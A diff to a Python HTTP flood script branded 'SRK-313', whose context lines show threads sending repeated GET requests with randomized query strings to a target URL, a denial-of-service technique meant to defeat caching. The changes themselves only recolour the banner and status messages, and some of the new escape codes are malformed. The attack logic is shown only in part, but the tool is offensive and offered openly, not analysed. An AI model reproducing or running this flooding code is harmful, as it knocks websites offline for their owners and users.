@@ -41,6 +41,12 @@ print("""
 \033[31m║\033[36m╚════╝  
 \033[31m║\033[36m
 \033[31m║\033[36m  
+\033[97mwhite
+\033[31mred
+\033[33myellow
+\033[34mblue
+\033[35m'agenta
+\033[36m'cyan
 """)
 
 while attemps < 100:
@@ -99,19 +105,17 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("\033[41mred color")
-                print("\033[31m[]  \033[102mSRK-313 \033[97m%s \033[31mSent to ••>  \033[33m[" +str(url)+ "]\033[0m")
-                print("\033[7mwhite color")
-                print("\033[7m[]  \033[102mSRK-313 \033[97m%s \033[31mSent to ••>  \033[33m[" +str(url)+ "]\033[0m")
+                print("\033[31m[]  \033[38;5;52mSRK-313  \033[38;5;39m%s  \033[38;5;21mSent to ••>   \033[38;5;206m[" +str(url)+ "]\033[0m")
+                print("\033[33m[]  \033[32mSRK-313 \033[97m%s \033[36mSent to ••>  \033[33m[" +str(url)+ "]\033[0m")
             except requests.exceptions.ConnectionError:
                 print("\033[35m[]  \033[102mSRK-313 \033[97m%s \033[31mSent to ••>  \033[33m[" +str(url)+ "]\033[0m")
 
                 pass
             except requests.exceptions.InvalidSchema:
-                print ("[REQUEST TIME OUT]")
+                print ("\033[38;5;154  Request time out")
                 raise SystemExit()
             except ValueError:
-                print ("[Check Your URL]")
+                print ("\033[38;5;242m  Check Your URL]")
                 raise SystemExit()
             except KeyboardInterrupt:
                 print("[Canceled by User]")
@@ -127,6 +131,12 @@ while True:
     except KeyboardInterrupt:
         exit("[Canceled By User]")
         raise SystemExit()
+
+
+
+
+
+
 
 
 
